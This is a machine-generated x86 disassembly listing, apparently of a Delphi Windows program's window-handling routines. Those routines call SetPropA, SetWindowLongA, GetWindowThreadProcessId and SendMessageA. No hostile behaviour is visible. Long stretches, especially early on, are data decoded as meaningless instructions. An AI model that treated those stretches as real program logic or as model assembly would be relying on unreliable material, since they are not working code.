test al 0xc0
inc ebx
add [ eax ] cl
jb r-xdata
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
add [ eax ] al
push 0xac00418a
add al [ edx ]
jo r-xdata
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
jbe r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
pop esp
adc [ eax ] eax
push esp
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
inc esp
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
add [ eax - 0x4bffbbe4 ] bh
xor [ eax ] eax
shl [ ecx ] 0x1
inc eax
add [ edx + eax + 0x34700042 ] ch
jo r-xdata
add [ eax - 0x76 ] ch
inc ecx
inc ebp
js r-xdata
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
outsb
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
lea eax [ eax ]
fadd st2
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax * 8 + 0x43 ] ah
add [ eax - 0x3b ] dl
inc ebx
add [ eax ] al
jbe r-xdata
add [ edx - 0x3b ] al
inc ebx
add [ ecx + eax ] bl
outsb
je r-xdata
add al 0x8
push es
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] bl
add [ eax + edi * 2 ] ch
inc ecx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
dec ebp
outsd
jne r-xdata
je r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] bl
add [ eax + edi * 2 ] ch
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
xor al 0xc2
inc ebx
add [ eax ] cl
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
adc [ eax ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
add [ edx + edi * 8 + 0x43 ] bh
add [ eax - 0x6fffbbd7 ] bl
sbb eax 0xa7400044
inc ecx
add [ eax + 0x29 ] ah
inc esp
add [ ebp + edi * 8 + 0x43 ] dh
add al ah
cld
inc ebx
add [ esi + eax + 0x2c40044 ] cl
inc edx
add [ edi + edi * 8 - 0x5bffbf ] ch
inc ecx
add ah cl
add al [ edx ]
movsb [ edi ] [ esi ]
stc
inc ebx
add [ eax ] ch
sbb [ eax + eax + 0x24 ] al
sbb [ eax + eax - 0xc ] al
sbb [ eax + eax - 0x18 ] al
sti
inc ebx
add [ ebx + eax ] ch
inc esp
add [ eax - 0x47ffbbfe ] dl
or eax [ eax + eax + 0x30 ]
sti
inc ebx
add [ ebx + edi * 8 ] dh
inc ebx
add [ eax ] dh
sub eax [ eax + eax + 0x5c ]
sub eax [ eax + eax + 0x74 ]
push es
inc esp
add [ esp + edi * 8 + 0x8000043 ] ch
inc esp
add [ eax + 0x7 ] bh
inc esp
add [ edx + ecx + 0x9380044 ] cl
inc esp
add [ ebx + ebx ] ah
inc esp
add al ah
sub eax [ eax + eax + 0x78 ]
or eax 0xdec0044
inc esp
add [ eax - 0x2 ] ah
inc ebx
add ah cl
or eax 0xe0044
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
int3
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_43c5b6
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050004 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
dec esp
add [ eax ] al
inc [ eax + eax + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x65480600
imul esp [ edi + 0x68 ] 0x43b26474
dec [ edx + eax ]
jae r-xdata
xor al 0x40
outsd
outsb
je r-xdata
inc esp
add [ eax ] al
sub [ eax + eax ] eax
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
add bh bh
or al 0x2
jb r-xdata
add ah ah
add eax [ edx ]
cmp [ edx + eax * 2 ] al
add ah dh
test [ ebx ] 0x8c
into
inc esp
add [ eax - 0x9 ] ch
inc ebx
add [ esi + ecx * 8 + 0x2da80044 ] dh
inc esp
add al ah
js r-xdata
add [ eax ] bh
add bh bh
mov al 0xa
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ esi ] al
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060005 ] al
imul esp [ gs : edi + 0x68 ] 0x43b26474
adc [ eax ] al
add [ eax ] 0x0
inc [ eax - 0x1f010000 ]
sub [ eax + eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040007 ] al
imul ebp [ esi + 0x74 ] r-xdata
push eax
add [ eax ] eax
call [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or [ eax ] al
or [ eax + 0x65 ] cl
insb
jo r-xdata
clc
inc ebx
add [ edi + esi * 8 - 0x30fbffbd ] bl
inc esp
add [ eax ] bl
iretd
push 0xb40043f7
into
inc esp
add [ eax - 0x1fffbbd3 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax - 0x7bffbdfd ] bl
sub eax 0x3cc0044
inc edx
add [ eax ] cl
clc
inc ebx
add [ eax ] al
add al 0x42
add [ eax + edi * 8 + 0x3500043 ] dh
inc edx
call sub_440a67
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax * 8 + 0x43 ] ah
jns r-xdata
add [ eax + eax ] ah
add [ eax ] al
pop esp
mov bh 0x43
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
int3
sub_43c974
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test dl cl
inc ebx
add [ eax ] ch
int 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x160043ca ] bl
int 0x43
add [ edx + eax ] al
add [ eax ] al
mov edx es
inc ebx
add [ edx + eax + 0x34700042 ] ch
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
add [ esp + ecx * 2 ] al
inc esp
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add ah bl
inc esp
add ah bl
jpo r-xdata
add [ esi + ebp * 2 + 0x44 ] ch
add [ eax ] dh
sti
inc ebx
add [ ebx + edi * 8 ] dh
inc ebx
add [ eax ] dh
sub eax [ eax + eax + 0x5c ]
sub eax [ eax + eax + 0x74 ]
push es
inc esp
add [ esp + edi * 8 + 0x8000043 ] ch
inc esp
add [ eax + 0x7 ] bh
inc esp
add [ edx + ecx + 0x9380044 ] cl
inc esp
add [ eax - 0x1fffbbb6 ] ah
sub eax [ eax + eax - 0x8 ]
outsb
inc esp
add [ edi + ebp * 2 + 0x6a780044 ] dh
inc esp
add [ eax - 0x7ffbb91 ] bl
xor [ eax + eax - 0x74 ] al
aaa
inc esp
add [ eax * 2 + 0x3f180044 ] ch
inc esp
add [ edx + eax * 2 ] dl
inc esp
add [ eax + eax * 2 + 0x44 ] al
add ah al
inc ebp
inc esp
add al cl
inc ebp
inc esp
add [ eax + 0x28004444 ] al
inc esp
inc esp
add al bl
jo r-xdata
add ah cl
inc ebx
inc esp
add [ eax - 0x59 ] al
inc ecx
add [ eax + 0x29 ] ah
inc esp
add [ ebp + edi * 8 + 0x43 ] dh
add [ eax - 0x73ffbbd0 ] al
push es
inc esp
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
add [ esi ] al
add eax 0x20000300
add [ eax ] al
add [ ecx + eax ] eax
add [ ecx ] eax
add eax 0x12010201
add [ edi ] ebp
add [ eax ] dl
add ch [ esi ]
add [ edx ] al
add [ ebx - 0x7bff7e00 ] al
add [ ebp + 0x11030f00 ] al
add ebx [ edx ]
add [ 0x7001e00 ] bl
add [ eax ] cl
add [ 0x7b010e01 ] cl
add [ edi ] dh
mov al 0x2e
mov al 0x5
mov al 0x6
mov al 0x7
mov al 0xb
mov al 0xc
mov al 0xd
mov al 0xe
mov al 0x3b
mov al 0xf
mov al 0x10
mov al 0x11
mov al 0x19
mov al 0x22
mov al 0x1a
mov al 0x1b
mov al 0x1c
mov al 0x24
mov al 0x35
mov al 0x25
mov al 0x26
mov al 0x27
mov al 0x2f
mov al 0x0
mov ebp 0xbd02bd01
add al 0xbd
push es
mov ebp 0xb033b02c
xor al 0xb0
cmp [ eax - 0x4fc54fc7 ] dh
cmp al 0xb0
sbb [ ebx ] al
out dx eax
add [ eax + 0x4e ] dh
inc esp
add [ edx + eax * 4 + 0x6d1c0044 ] ch
inc esp
add [ eax + esi * 2 + 0x44 ] al
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx + ecx * 8 ] bh
inc ebx
add [ ecx + eax ] bh
add [ eax + ecx * 8 ] cl
inc ebx
add [ eax + 0x69000001 ] cl
add [ edi ] cl
add [ ecx ] dl
add [ esi ] ecx
adc eax 0x15011400
add [ ecx ] edi
add [ 0x2c002b00 ] ch
add [ eax + eax ] dl
inc edi
sub_43cfe5
rol [ ebx ] 0x1
push cs
rol [ ebx ] 0x1
sbb [ edx ] al
add [ eax ] al
insb
into
inc ebx
add [ edx + eax + 0x34700042 ] ch
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
add [ esp + ecx * 2 ] al
inc esp
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ ebp + ecx * 4 + 0x7bdc0044 ] al
inc esp
add ah cl
inc ebx
inc esp
add [ eax - 0x59 ] al
inc ecx
add [ eax + 0x29 ] ah
inc esp
add [ ebp + edi * 8 + 0x43 ] dh
add [ eax - 0x73ffbbd0 ] al
push es
inc esp
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
sub_43d148
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
rol [ ebx ] 0x1
sub [ eax ] al
add [ eax ] al
or [ ecx ] dl
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
sub_43d238
sbb dl dl
inc ebx
add [ edx ] ah
rol [ ebx ] cl
sub al 0xd2
inc ebx
add [ ebp - 0x5affbc2f ] bl
rol [ ebx ] 0x1
lodsd [ esi ]
rol [ ebx ] 0x1
mov ch 0xd1
inc ebx
add dl al
rol [ ebx ] 0x1
iretd
sub_43d318
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
rol [ ebx ] cl
sub [ eax ] al
add [ eax ] al
or [ ecx ] dl
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax ] bh
mov ecx 0x54060044
dec ebp
outsd
jne r-xdata
inc [ ecx ]
int3
nop
mov ah 0xd3
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edx * 8 + 0x43 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
aam 0x43
add [ eax ] cl
add al [ eax ]
add [ eax - 0x37 ] dh
inc ebx
add [ edx + eax + 0x34700042 ] ch
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
add [ esp + ecx * 2 ] al
inc esp
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add ah bl
inc esp
add ah bl
jpo r-xdata
add [ esi + ebp * 2 + 0x44 ] ch
add [ eax ] dh
sti
inc ebx
add [ ebx + edi * 8 ] dh
inc ebx
add [ eax ] dh
sub eax [ eax + eax + 0x5c ]
sub eax [ eax + eax + 0x74 ]
push es
inc esp
add [ esp + edi * 8 + 0x8000043 ] ch
inc esp
add [ eax + 0x7 ] bh
inc esp
add [ edx + ecx + 0x9380044 ] cl
inc esp
add [ eax - 0x1fffbbb6 ] ah
sub eax [ eax + eax - 0x8 ]
outsb
inc esp
add [ edi + ebp * 2 + 0x6a780044 ] dh
inc esp
add [ eax - 0x7ffbb91 ] bl
xor [ eax + eax - 0x74 ] al
aaa
inc esp
add [ eax * 2 + 0x3f180044 ] ch
inc esp
add [ edx + eax * 2 ] dl
inc esp
add [ eax + eax * 2 + 0x44 ] al
add ah al
inc ebp
inc esp
add al cl
inc ebp
inc esp
add [ eax + 0x28004444 ] al
inc esp
inc esp
add al bl
jo r-xdata
add ah cl
inc ebx
inc esp
add [ eax - 0x59 ] al
inc ecx
add [ eax + 0x29 ] ah
inc esp
add [ ebp + edi * 8 + 0x43 ] dh
add [ eax - 0x73ffbbd0 ] al
push es
inc esp
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
je r-xdata
add [ eax + 0x4e ] dh
inc esp
add [ edx + eax * 4 + 0x6d1c0044 ] ch
inc esp
add [ eax + esi * 2 + 0x44 ] al
add [ edx + ebp ] bl
inc eax
add [ edx + ebp ] bl
inc eax
add [ edx + ebp ] bl
inc eax
add [ edx + ebp ] bl
inc eax
add [ edx + ebp ] bl
inc eax
add [ edx + ebp ] bl
inc eax
add [ edx + ebp ] bl
inc eax
add [ edx + ebp ] bl
inc eax
add [ eax - 0x40 ] cl
inc esp
add [ edx + ebp ] bl
inc eax
add [ edx ] dl
push esp
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
push eax
salc
outsd
outsb
je r-xdata
add ah bh
je r-xdata
inc esp
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
inc ecx
add [ eax + 0x34 ] bh
inc eax
add [ esp + ecx * 2 ] al
inc eax
add [ eax ] al
cld
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add ah bl
inc esp
add ah bl
jpo r-xdata
outsd
add [ esi + ebp * 2 + 0x44 ] ch
add ah cl
inc ebx
inc esp
add [ eax - 0x59 ] al
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
outsd
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
jne r-xdata
add [ eax + 0x4e ] dh
inc esp
add [ edx + eax * 4 + 0x6d1c0044 ] ch
inc esp
add [ eax + esi * 2 + 0x44 ] al
add [ edx + ebp ] bl
inc eax
add [ edx + ebp ] bl
inc eax
add [ edx + ebp ] bl
inc eax
add [ edx + ebp ] bl
inc eax
add [ edx + ebp ] bl
inc eax
add [ edx + ebp ] bl
inc eax
add [ edx + ebp ] bl
inc eax
add [ edx + ebp ] bl
inc eax
add [ eax - 0x40 ] cl
inc esp
add [ edx + ebp ] bl
inc eax
add [ edx + ebp ] bl
inc eax
add [ edx + ebp ] bl
inc eax
add [ 0x73754354 ] bl
inc esp
dec esp
insb
nop
mov esp 0x70043d4
adc dl [ ebx + eax * 2 + 0x75 ]
jae r-xdata
inc ecx
add [ eax + 0x29 ] ah
inc esp
add [ ebp + edi * 8 + 0x43 ] dh
add [ eax - 0x73ffbbd0 ] al
push es
insb
mov ah 0xd3
inc ebx
add [ ecx * 8 + 0xb0043 ] ah
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ebx - 0x6f76f7ab ] cl
add [ ecx ] 0x0
add [ ecx + rw-data ] ah
mov eax [ eax + 0x18c ]
je r-xdata
sti
insd
dec ebp
jne r-xdata
inc edx
add [ edi + edi * 8 - 0x5bffbf ] ch
inc ecx
add ah cl
add al [ edx ]
mov eax 0xf000442d
jbe r-xdata
outsd
insb
jae r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
inc esi
je r-xdata
sub eax [ eax + eax - 0x8 ]
outsb
inc esp
add [ edi + ebp * 2 + 0x6a780044 ] dh
inc esp
add [ eax - 0x7ffbb91 ] bl
xor [ eax + eax - 0x74 ] al
aaa
inc esp
add [ eax * 2 + 0x3f180044 ] ch
inc esp
add [ edx + eax * 2 ] dl
inc esp
add [ eax + eax * 2 + 0x44 ] al
add ah al
inc ebp
inc esp
add al cl
inc ebp
inc esp
add [ eax + 0x28004444 ] al
inc esp
inc esp
add al bl
jo r-xdata
add al ah
add [ eax ] dh
sti
inc ebx
add [ ebx + edi * 8 ] dh
inc ebx
add [ eax ] dh
sub eax [ eax + eax + 0x5c ]
sub eax [ eax + eax + 0x74 ]
push es
inc esp
add [ esp + edi * 8 + 0x8000043 ] ch
inc esp
add [ eax + 0x7 ] bh
inc esp
add [ edx + ecx + 0x9380044 ] cl
inc esp
add [ eax - 0x1fffbbb6 ] ah
add [ esp + edi * 2 ] cl
inc esp
add [ eax + 0x7b ] bl
inc esp
add al ch
sti
inc ebx
add [ ecx + esi * 2 + 0x44 ] ch
add [ ecx + esi * 2 + 0x6e6c0044 ] cl
inc esp
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edx * 8 ] ch
inc ebx
add [ edx + eax ] cl
add [ eax ] al
push 0xac0043d3
add al [ edx ]
jo r-xdata
add [ ebp - 0x2acbffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2a ] dl
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push ebx
insb
arpl [ gs : esp + ecx * 2 + 0x69 ] si
jae r-xdata
push eax
add [ eax ] al
inc ebx
outsd
outsb
je r-xdata
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
outsd
insb
mov eax eax
push eax
salc
inc ebx
add [ edi ] al
sbb eax 0x73754354
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
insd
dec ebp
jne r-xdata
je r-xdata
inc ebp
or [ eax - 0x18 ] dl
and [ ebx + 0xa9fffc ] dl
add [ eax ] al
inc eax
je r-xdata
push ebx
insb
arpl [ gs : esp + ecx * 2 + 0x69 ] si
jae r-xdata
push eax
call GetWindowLongA
test eax eax
jne r-xdata
inc ebx
outsd
outsb
je r-xdata
xchg ebx eax
cld
inc [ ebp - 0x74f08a40 ]
inc ebp
or [ eax + 0x6a ] dl
hlt
outsd
insb
xor al 0xd5
inc ebx
add [ eax + 0xb0043d4 ] bh
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
fist [ esp + edi * 8 - 0x4375e01 ]
inc esi
add [ eax + 0xf ] dl
mov bh 0x5
sub bh [ ebx + 0x47 ]
add [ eax - 0x75 ] dl
inc ebp
or [ eax - 0x18 ] dl
xchg esp eax
xchg esp eax
cld
jmp [ ecx + rw-data ]
outsd
insb
jae r-xdata
add [ edx + 0x1ea8010 ] cl
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_43d698
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_43d750
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_43d784
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_40442c
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_43d750
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_43d7e0
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_43d9c4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c570
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_40448c
mov eax edi
mov edx esi
call sub_403fc0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43da08
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c570
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_40448c
mov eax edi
mov edx esi
call sub_403fc0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43da74
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
jne r-xdata
mov eax ebx
call sub_4470c4
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_43db20
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_41a19c
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_43db54
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4470c4
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_43db7c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_40278c
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_43db54
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_43db20
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_41a040
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41a218
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43dbd8
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_41a074
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_41a19c
mov edx 0x8
call sub_4027ac
inc esi
dec ebx
jne r-xdata
sub_43dc0c
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_41a19c
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_43db20
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_43dc70
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_43dcd0
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_40316c
mov edx esp
mov eax esi
call sub_4041d0
add esp 0x100
pop esi
pop ebx
retn
sub_43dd0c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43ddd6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
